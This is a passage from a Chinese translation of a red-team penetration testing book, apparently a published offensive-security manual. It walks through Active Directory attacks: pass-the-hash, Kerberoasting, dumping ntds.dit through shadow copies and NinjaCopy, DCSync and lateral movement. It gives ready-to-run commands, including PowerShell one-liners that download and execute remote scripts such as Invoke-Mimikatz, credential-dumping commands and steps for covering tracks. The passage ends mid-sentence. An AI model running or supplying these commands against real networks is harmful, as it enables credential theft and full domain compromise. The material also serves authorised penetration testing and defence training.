Pass-the-Hash
过去传递本地管理帐户 Pass-The-Hash（PTH）的方法在很大程度上已经开始消失。虽然还
没有完全消失，但让我们快速回顾一下。PTH 攻击利用 Windows NTLM 哈希对系统进行身份
验证，而不是使用用户的凭据。这是很重要的一点，首先，使用 Mimikatz 这样的工具可以很
容易地恢复哈希，可以为本地帐户提取哈希（但需要本地管理员权限），可以从转储域控制
器（不是明文密码）中恢复哈希（DCsync）等等。
PTH 最基本的用途是攻击本地管理员。由于默认情况下本地管理员帐户已被禁用，并且出现
了更新的安全功能，例如本地管理员密码解决方案（LAPS），为每个工作站创建随机密码，
因此通常很少使用上述这种方法。过去，在一个工作站上获取本地管理帐户的哈希值在整个
组织中是可以用相同的方法实现的，这意味着一个易受攻击的方案会使整个公司破产。
当然，这要求你必须是系统上的本地管理员，启用本地管理员帐户“administrator”，并且它是
RID 500帐户（意味着它必须是原始管理员帐户，不能是新创建的本地管理员帐户）。
143
第4章 带球——开始攻击网络
执行命令： shell net user administrator
User name Administrator
Full Name
Comment Built-in account for administering the computer/domain
User’s comment
Country/region code 000 (System Default)
Account active Yes
Account expires Never
如果我们看到帐户处于活动状态，我们可以尝试从本地计算机中提取所有哈希值。请记住，
这不会包括任何域账户哈希：
Empire Module: powershell/credentials/powerdump
Metasploit Module: http://bit.ly/2qzsyDI
例如：
(Empire: powershell/credentials/powerdump) > execute
Job started: 93Z8PE
输出：
Administrator:500:
aad3b435b51404eeaad3b435b51404ee:3710b46790763e07ab0d2b6cfc4470c1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
9c0:::
我们可以使用 Empire（credentials/mimikatz/pth）或者启动可信任的 psexec，提交我们的哈
希，并执行我们的自定义 payload，如下图所示：
144
第4章 带球——开始攻击网络
如前所述，这是一种现在少见的古老的横向移动方式。如果你仍在考虑利用本地管理员帐
户，但所处的环境有 LAPS（本地管理员密码解决方案），你可以使用几个不同的将它们从
Active Directory 中转储出的工具。这假设你已经拥有一个域管理员或 Helpdesk 类型帐户的
权限：
https://github.com/rapid7/metasploit-
framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb
ldapsearch -x -h 10.100.100.200 -D “elon.muskkat” -w password -b
“dc=cyberspacekittens，dc=local” “(ms-MCS-AdmPwd=*)” ms-MCSAdmPwd
[https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/]
这是保持横向移动而不注销 Helpdesk 用户帐户的好方法。
从服务帐户获取凭据
如果你发现自己处于一个用户权限受限、无法从内存中提取密码、主机系统上没有密码的情
况下，该怎么办...接下来该怎么办？好吧，我最喜欢的攻击之一是 Kerberoasting。
145
第4章 带球——开始攻击网络
我们都知道 NTLM 存在缺陷，这是由于单向哈希（不含盐）、重放攻击和其他传统问题造成
的，这也是许多公司转向采用 Kerberos 的原因。如我们所知，Kerberos 是一种安全的方
法，用于对计算机网络中的服务请求进行身份验证。我们不会深入研究 Windows 中的
Kerberos 实现。但是，你应该知道域控制器通常充当票据授予的服务器；网络上的用户可以
请求票据授予服务器以获取资源访问权的凭证。
什么是最严重的攻击？作为攻击者，我们可以掌握我们之前提取的目标服务帐户的任何 SPN
请求 Kerberos 服务票证。漏洞在于，当从域控制器请求服务票据时，该票证使用关联的服务
用户的 NTLM 哈希加密。由于任何用户都可以请求任何票据，这意味着，如果我们可以猜测
关联服务用户的 NTLM 哈希（加密票据的）的密码，那么我们现在就知道实际服务帐户的密
码。这听起来可能有点令人困惑，所以让我们来看一个例子。
与以前类似，我们可以列出所有的SPN服务。这些是我们将为其提取所有 Kerberos 票据的服
务帐户：
setspn -T cyberspacekittens.local -F -Q /
我们可以将单个用户的 SPN 作为目标，也可以将所有用户的 Kerberos 票据拉入用户的内存
中：
针对单个用户：
powershell Add-Type -AssemblyName System.IdentityModel;New-Object
System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
“HTTP/CSK-GITHUB.cyberspacekittens.local”
将所有用户票据拖到内存中
powershell Add-Type -AssemblyName System.IdentityModel;IEX (New-Object
Net.WebClient).DownloadString(“
https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1 ”) |
ForEach-Object {try{New-
ObjectSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken -
ArgumentList $_.ServicePrincipalName}catch{}}
当然，你也可以使用 powersploit 执行此操作：
https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
146
第4章 带球——开始攻击网络
如果成功的话，我们已经将一个或多个不同的 Kerberos 票证导入到受害者计算机的内存中。
我们现在需要一种方法来提取票据。我们可以使用好工具 Mimikatz Kerberos 导出：
powershell.exe -exec bypass IEX (New-Object
Net.WebClient).DownloadString(‘http://bit.ly/2qx4kuH’); Invoke-Mimikatz -Command
’”““kerberos::list /export”””’
一旦我们导出这些票证，它们将仍会驻留在受害者的机器上。在我们开始破解它们之前，我
们必须从它们的系统中下载它们。请记住，票据是用服务帐户的 NTLM 哈希加密的。所以，
如果我们能猜到 NTLM 哈希，我们就可以读取票据，现在也知道服务帐户的密码。破解账户
最简单的方法是使用一个名为 tgsrepcrack 的工具（JTR 和 Hashcat 也支持破解
Kerberoast，稍后我们将讨论）。使用 Kerberoast 破解票证：
使用 Kerberoast 来破解票据：
cd /opt/kerberoast
python tgsrepcrack.py [password wordlist ][kirbi ticketss - *.kirbi]
在这个例子中，服务帐户 csk-github 的密码是“p@ssw0rd!”
当然，Empire 有一个 PowerShell 模块为我们做所有需要做的事情。它位于
powershell/credentials/invoke_kerberoast 目录下（
https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invok
e-Kerberoast.ps1 ）。
你可以用 John the Ripper 甚至 Hashcat 来破解密码并输出结果。我以前在非常大的网络环境
中运行 PowerShell 脚本时遇到过一些问题，因此，退一步的方法是使用 PowerShell 和
Mimikatz 将所有的票据都获取下来。
147
第4章 带球——开始攻击网络
转储域控制器哈希
一旦我们获得了域管理访问权，从 DC 中提取所有哈希的老方法就是在域控制器上运行命
令，并使用 Shadow Volume 或原始拷贝技术提取 ntds.dit 文件。
回顾磁盘卷影复制技术
由于我们确实可以访问文件系统，并且可以作为攻击者在域控制器上运行命令，因此我们希
望获取存储在 ntds.dit 文件中的所有域内哈希。不幸的是，该文件不断地被读和写，即使作为
系统，我们也无法读取或复制该文件。幸运的是，我们可以利用名为 Volume Shadow Copy
Service 磁盘复制服务（VSS）的 Windows 功能，该功能将创建磁盘的快照副本。然后我们
可以从该副本中读取 Ntds.dit 文件将其获取出来。并将其从计算机上取消，这包括窃取
Ntds.dit、System、SAM 和 Boot Key 文件。最后，我们需要清理我们的行踪并删除磁盘拷
贝：
C:\vssadmin create shadow /for=C:
copy \?
\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\syste
m32\config\SYSTEM.
copy \?
\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\syste
m32\config\SAM.
148
第4章 带球——开始攻击网络
reg SAVE HKLM\SYSTEM c:\SYS
vssadmin delete shadows /for= [/oldest | /all | /shadow=]
NinjaCopy
Ninjacopy 是另一个工具，一旦我们在域控制器上，就可以用来获取 Ntds.dit 文件。
Ninjacopy “通过读取原始磁盘卷并分析 NTFS 结构，从 NTFS 分区磁盘复制文件。这将绕过
文件 DACL（任意访问控制列表）、读取句柄锁和 SACL（系统访问控制列表）。但你必须是
管理员才能运行这个脚本。这可用于读取通常锁定的系统文件，如 NTDS.dit 文件或注册表配
置单元。”[http://bit.ly/2HpvKwj]
Invoke-NinjaCopy -Path “c:\windows\ntds\ntds.dit” -LocalDestination
“c:\windows\temp\ntds.dit
DCSync
现在，我们已经回顾了从 DC 提取哈希的老方法，这些方法要求你在 DC 上运行系统命令，
并且通常需要在该计算机上删除一些文件，让我们继续讨论新方法。最近，由 Benjamindelpy
和 Vincent Le Toux 编写的 DCSync 引入并改变了从域控制器转储哈希的玩法。DCSync 的概
念是它模拟域控制器来请求该域中用户的所有哈希。这意味着，只要你有权限，就不需要运
行任何域控制器上的命令，也不必删除 DC 上的任何文件。
但是要使 DCSync 工作，必须具有从域控制器中提取哈希的适当权限。通常是限于域管理
员、企业管理员、域控制器用户组以及将复制更改权限设置为允许（即复制所有更改和复制
目录更改）的任何人，DCSync 将允许你的用户执行此攻击。这种攻击最初是在 Mimikatz 开
发的，可以使用以下命令运行：
Lsadump::dcsync /domain:[YOUR DOMAIN] /user:[Account_to_Pull_Hashes]
更好的是，DCSync 被引入了 PowerShell Empire 这样的工具，以使其更容易实现。
Empire 模块：powershell/credentials/mimikatz/dcsync_hashdump
149
第4章 带球——开始攻击网络
查看 DCSync hashdump，我们可以看到 Active Directory 中用户的所有 NTLM 哈希。此外，
我们还有 krbtgt NTLM 哈希，这意味着我们现在（或在未来的活动中）可以执行 Golden
Ticket attacks（黄金票据攻击）。
利用 VPS 在内网进行 RDP 横向移动
在当今世界，有了大量的新一代杀毒软件，在计算机之间横向运行 WMI/PowerShell
Remoting/PSExec 并不总是最好的选择。我们还看到一些组织系统正在记录所有发生的
Windows 命令提示。为了解决这一切，我们有时需要回到基本的横向运动。使用 VPS 服务器
的问题是，它只是一个没有 GUI 接口的 shell。因此，我们将配置路由和代理转发来自攻击者
主机的流量，通过 VPS，然后再到被攻陷的主机，最后横向移动到下一个受害者。幸运的
是，我们可以使用大部分本地工具完成任务。
150
第4章 带球——开始攻击网络
首先，我们需要设置一个 VPS 服务器，启用开放到公网的多个端口，用 PTF 配置
Metasploit，并用 Meterpreter 攻陷最初的受害者。我们也可以用 Cobalt Strike 或其他框架来
实现这一点，但在本例中我们将使用 Meterpreter。
我们可以利用默认的 SSH 客户机，使用本地端口转发（-L）。在这个场景中，我使用的是
Mac，但这也可以在 Windows 或 Linux 系统上完成。我们将使用 SSH 密钥通过 SSH 连接到